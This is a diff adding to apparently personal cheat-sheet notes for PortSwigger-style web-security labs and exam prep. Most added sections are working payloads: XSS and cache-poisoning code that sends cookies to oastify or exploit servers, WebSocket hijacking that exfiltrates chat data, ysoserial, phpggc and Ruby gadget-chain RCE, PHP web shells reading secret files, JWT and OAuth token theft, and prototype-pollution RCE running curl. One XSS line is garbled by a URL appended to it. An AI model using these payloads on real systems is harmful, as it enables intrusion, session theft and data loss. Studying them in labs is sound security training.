@@ -10,6 +10,7 @@
 * Content Type Convertor
 * Server-Side Prototype Pollution Scanner
 * DOM Invader (burp browser)
+* Java Deserialization Scanner
 
 ## Tips:
 1. Use targeted scan (in Intruder highlight insertion point and use option run targeted scan)   
@@ -39,7 +40,7 @@ Adapted version:
 ```
 3. Reflected DOM XSS  
 ```
-\"-alert()}//
+\"-alert()}//https://github.com/B310M0R/notes/blob/main/useful.md
 ```
 Adapted:
 ```
@@ -173,6 +174,12 @@ Can be interpreted as
 
 ```
 "+eval(atob("ZmV0Y2goImh0dHBzOi8vYnVycC5vYXN0aWZ5LmNvbS8/Yz0iK2J0b2EoZG9jdW1lbnRbJ2Nvb2tpZSddKSk="))}//
+```
+### Possibly helpful to steal cookie
+```
+"-(window["document"]["location"]="https://exploit%2D0ac7002303d74533c0b472c9016a00f3%2Eexploit%2Dserver%2Enet/?c="+window["document"]["cookie"])-"  
+OR my variant:  
+"-(window["location"]="http://umk7m0a67ilv35u5uonbj2i08rei29qy%2eoastify%2ecom/?c="+window["document"]["cookie"])}//
 ```
 ## SQL injections
 If you have `Advanced Search` page on your exam, you are more likely about to get easy priv escalation.  
@@ -693,3 +700,376 @@ It will process Host Header Injection
 11. Password brute-force via password change  
 While processing password changing, observe that you can change nickname.
 Change it to victim's one and brute his password
+## Business logic Authentication vulnerability
+1. Authentication bypass via flawed state machine  
+If you got the role-selector page, just turn On the Interception and drop this request.  
+2. Weak isolation on dual-use endpoint  
+Delete current-password parameter and change username to administrator
+
+## WebSockets
+Arises at Live Chat page.
+### Exploits
+1. Manipulating WebSocket messages to exploit vulnerabilities  
+Write something in Live Chat. Go to WebSocket History tab in Burp, catch you request and send it to Repeater. Change your message to `<img src=123 onerror=alert()>`
+2. Manipulating the WebSocket handshake to exploit vulnerabilities  
+```
+X-Forwarded-For: 1.1.1.1
+<img src=1 oNeRrOr=alert`1`>
+```
+3. Cross-site WebSocket hijacking  
+```
+<script>
+    var ws = new WebSocket('wss://your-websocket-url/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+## Web cache poisoning
+Watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response. If you got only tracking.js without X-Cache - no cache poisoning here  
+If you got both file and header, the first thing you should try is to inject your exploit server into Host: or X-Forwarded-Host: headers and check them in response  
+go to your exploit server, set the File name /resources/js/tracking.js and in Body section paste the next payload: `document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')`.  
+Poison web cache with your server and wait for victim's cookies.  
+### Exploits
+1. Web cache poisoning with an unkeyed header  
+```
+X-Forwarded-Host: kek.com"></script><script>alert(document.cookie)</script>//
+```
+2. Web cache poisoning with an unkeyed cookie  
+```
+Cookie: session=x; fehost=prod-cache-01"}</script><script>alert(1)</script>//
+```
+3. Web cache poisoning with multiple headers  
+On exploit-server change the file name to match the path used by the vulnerable response: /resources/js/tracking.js. In body write alert(document.cookie) script.  
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
+X-Forwarded-Host: exploit-server.web-security-academy.net/
+X-Forwarded-Scheme: http
+```
+4. Targeted web cache poisoning using an unknown header  
+HTML is allowed in comment section. Steal user-agent of victim with `<img src="http://collaborator.com">` payload.  
+```
+GET / HTTP/1.1
+Host: vulnerbale.net
+User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
+X-Host: attacker.com
+```
+5. Web cache poisoning via an unkeyed query string  
+```
+/?search=kek'/><script>alert(1)</script>
+Origin:x
+```
+6. Web cache poisoning via an unkeyed query parameter  
+```
+/?utm_content=123'/><script>alert(1)</script>
+```
+7. Parameter cloaking
+```
+/js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
+```
+8. Web cache poisoning via a fat GET request
+```
+GET /js/geolocate.js?callback=setCountryCookie
+Body:
+callback=alert(1)
+```
+9. URL normalization  
+```
+/random"><script>alert(1)</script>
+Cache this path and then deliver URL to the victim
+```
+## Insecure deserialization
+Use Java Deserialization Scanner extension for Burp Suite to detect type of serialized object.  
+Use ysoserial and phpggc  
+```
+java -jar --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w0 | xclip -selection clipboard
+```
+### Exploits
+1. Modifying serialized data types
+```
+1. Change username to administrator (13 symbols)
+2. Change parameter access_token from s to i as follows:
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
+2. Using application functionality to exploit insecure deserialization
+```
+1. Delete additional user.
+2. For the POST /my-account/delete request change deserialized session cookie to:
+s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
+3. Send it.
+```
+3. Arbitrary object injection in PHP
+```
+1. Check for /libs/CustomTemplate.php~
+2. Find out destruct() method
+3. Create next payload:
+O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+```
+4. Exploiting Java deserialization with Apache Commons
+```
+1. Use burp scanner to identify that the serialized object is Java Commons
+2. Use ysoserial to create new payload
+3. Base64 + URL encode it
+```
+5. Exploiting PHP deserialization with a pre-built gadget chain
+```
+1. Find out php.info
+2. Find out Symfony ver and Secret Key
+3. Create next payload:
+phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w 0
+4. Sign it with Secret Key using PHP code
+<?php
+$object = "OBJECT-GENERATED-BY-PHPGGC";
+$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
+$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
+echo $cookie;
+```
+6. Exploiting Ruby deserialization using a documented gadget chain
+```
+1. Use burp scanner to identify that the serialized object is Ruby using Marshal
+2. Use the next code to create own object: 
+https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html 
+```
+```
+# Autoload the required classes
+Gem::SpecFetcher
+Gem::Installer
+
+# prevent the payload from running when we Marshal.dump it
+module Gem
+  class Requirement
+    def marshal_dump
+      [@requirements]
+    end
+  end
+end
+
+wa1 = Net::WriteAdapter.new(Kernel, :system)
+
+rs = Gem::RequestSet.allocate
+rs.instance_variable_set('@sets', wa1)
+rs.instance_variable_set('@git_set', "id")
+
+wa2 = Net::WriteAdapter.new(rs, :resolve)
+
+i = Gem::Package::TarReader::Entry.allocate
+i.instance_variable_set('@read', 0)
+i.instance_variable_set('@header', "aaa")
+
+
+n = Net::BufferedIO.allocate
+n.instance_variable_set('@io', i)
+n.instance_variable_set('@debug_output', wa2)
+
+t = Gem::Package::TarReader.allocate
+t.instance_variable_set('@io', n)
+
+r = Gem::Requirement.allocate
+r.instance_variable_set('@requirements', t)
+
+payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
+puts Base64.encode64(payload)
+```
+## HTTP Host header attacks
+The best place, where you can set this type of attacks is in Forgot password? functionality.  
+Set your exploit server in Host and change username to victim's one  
+Go to exploit server logs and find victim's forgot-password-token  
+These Headers can also be used, when Host does not work:
+```
+X-Forwarded-Host: exploit-server.com
+X-Host: exploit-server.com
+X-Forwarded-Server: exploit-server.com
+```
+### Exploits
+1. To send malicious email put your server in Host
+```
+Host: exploit-server.com
+```
+2. Admin panel from localhost only
+```
+GET /admin HTTP/1.1
+Host: localhost
+```
+3. Double Host / Cache poisoning
+```
+Host: 0adf00cc033d5f09c05b077d000200eb.web-security-academy.net
+Host: "></script><script>alert(document.cookie)</script>
+```
+4. SSRF
+```
+GET /admin HTTP/1.1
+Host: 192.168.0.170
+```
+5. SSRF
+```
+GET https://0a44007e03fb1d0cc0068900005000d1.web-security-academy.net HTTP/1.1
+Host: 192.168.0.170
+```
+6. Dangling markup
+```
+Host: 0a42005f03d221bec0c45997001600ce.web-security-academy.net:'<a href="http://burp-collaborator.com?
+```
+## OAuth authentication
+Arises at Sign-in page. The main request to play with is `/auth?client_id=...`
+### Exploits
+1. Authentication bypass via OAuth implicit flow  
+Intercept the whole process of OAuth authentication and observe /authenticate POST request that contains email and username. Change these parameters to carlos'.
+2. Forced OAuth profile linking  
+Intercept the whole process of OAuth authentication and observe /oauth-linking request with code. This request is without state parameter, so Generate CSRF PoC and drop the request. Send it to victim and login via OAuth.  
+3. OAuth account hijacking via redirect_uri  
+Intercept the whole process of OAuth authentication and observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`, change `redirect_uri` to your collaborator server and Generate CSRF PoC, drop the request. Send it to victim and find out his `/oauth-callback?code`.  
+4. Stealing OAuth access tokens via an open redirect  
+Same as the previous one observe `/auth?client_id=xxx&redirect_uri=xxx&response_type=xxx&scope=xxx`.  
+On home page open any post and at the bottom observe "Next post" button. It is open redirect.  
+Write the next URL:
+```
+. . . redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/ . . .
+```
+This will redirect us to our exploit server and send us oauth code as fragment identifier, so we need to extract this value using JS  
+Final payload:
+```
+<script>
+    if (!document.location.hash) {
+        window.location = "https://oauth-xxx.web-security-academy.net/auth?client_id=np1l4fiaizdo4d6r09enk&redirect_uri=https://xxx.web-security-academy.net/oauth-callback/../../post/next?path=https://exploit-xxx.exploit-server.net/exploit/&response_type=token&nonce=-2091701200&scope=openid%20profile%20email"
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+```
+## File upload vulnerabilities
+Arises at My-account Avatar upload
+### Exploits
+1. Web shell upload via Content-Type restriction bypass  
+Change Content-Type to image/jpeg  
+2. Web shell upload via path traversal  
+Create web shell with directory traversal in filename (../) and URL encode it (%2e%2e%2f)  
+Now you can get your file with /files/avatars/../rce2.php  
+3. Web shell upload via extension blacklist bypass  
+.php is blacklisted, but you can set .phar extension  
+Also here be "correct" method using .htaccess method:
+```
+COMES SOON
+```
+4. Web shell upload via obfuscated file extension
+```
+Null byte bypass rce.php%00.jpg
+```
+5. Remote code execution via polyglot web shell upload  
+Polyglot PHP/JPG file is an standard Image but with PHP code in metadata.  
+```
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" lel.jpg -o polyglot.php
+```
+6. Admin Panel RFI  
+RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be HTTPS and the file extension is checked  
+Incorrect RFI result in response message, File must be either a jpg or png.  
+To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:  
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+To bypass filters and provoke RFI, use the next payload:
+```
+https://exploit-server.com/shell.php#kek.jpg
+```
+## JWT
+* Use JWT Editor extension or JSON Web Tokens  
+### Exploits
+1. JWT authentication bypass via unverified signature  
+Simply change "sub" to administrator  
+2. JWT authentication bypass via flawed signature verification  
+None algorithm (set "alg": "none" and delete signature part)  
+3. JWT authentication bypass via weak signing key  
+Weak key is easily detected by Burp Suite Passive Scanner  
+Crack signing key with hashcat
+```
+hashcat -m 16500 -a 0 <full_jwt> /usr/share/wordlists/rockyou.txt
+```
+4. JWT authentication bypass via jwk header injection  
+Go to JWT Editor Keys - New RSA Key - Generate  
+Get Request with JWT token - Repeater - JSON Web Token tab - Attack (at the bottom) - Embedded JWK - Select your previously generated key - OK  
+5. JWT authentication bypass via jku header injection  
+JWT Editor Keys - New RSA Key - Generate - right-click on key - Copy Public Key as JWK  
+Go to your exploit server and paste the next payload in Body:  
+```
+{
+    "keys": [
+
+    ]
+}
+```
+In "keys" section paste your previously copied JWK
+```
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+        }
+    ]
+}
+```
+Back to our JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.  
+Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.  
+Change "sub" to administrator  
+Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key  
+6. JWT authentication bypass via kid header path traversal  
+JWT Editor Keys - New Symmetric Key - Generate - replace the value of "k" parameter to AA== - OK  
+Back to our JWT, replace "kid" parameter with ../../../../../dev/null  
+Change "sub" to administrator  
+Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key  
+## Prototype pollution
+DOM-Invader extension  
+Arises, usually, in these JS files: searchLogger.js, searchLoggerAlternative.js and similar searchLogger...  
+### Exploits
+1. DOM XSS via client-side prototype pollution  
+```
+https://site.com/?__proto__[transport_url]=data:,alert(1)
+```
+2. DOM XSS via an alternative prototype pollution vector  
+```
+https://site.com/?__proto__.sequence=alert(1)-
+```
+3. Client-side prototype pollution via flawed sanitization
+```
+https://site.com/?__pro__proto__to__[transport_url]=data:,alert(1)
+```
+4. Client-side prototype pollution in third-party libraries
+```
+https:/site.com/#__proto__[hitCallback]=alert(document.cookie)
+```
+5. Client-side prototype pollution via browser APIs
+```
+https://site.com/?__proto__[value]=data:,alert(1)
+```
+6. Privilege escalation via server-side prototype pollution
+```
+Billing and Delivery Address:
+"__proto__": {
+    "isAdmin":true
+}
+```
+7. Detecting server-side prototype pollution without polluted property reflection
+```
+"__proto__": {
+ "status":555
+}
+```
+8. Bypassing flawed input filters for server-side prototype pollution
+```
+ "constructor":{
+"prototype":{
+"isAdmin":true
+}}
+```
+9. Remote code execution via server-side prototype pollution
+```
+"__proto__":
+{"execArgv": [
+  "--eval=require('child_process').execSync('curl https://kmazepmj6dq3jzpk2e4ah7fzuq0ho9cy.oastify.com')"
+]}
+```
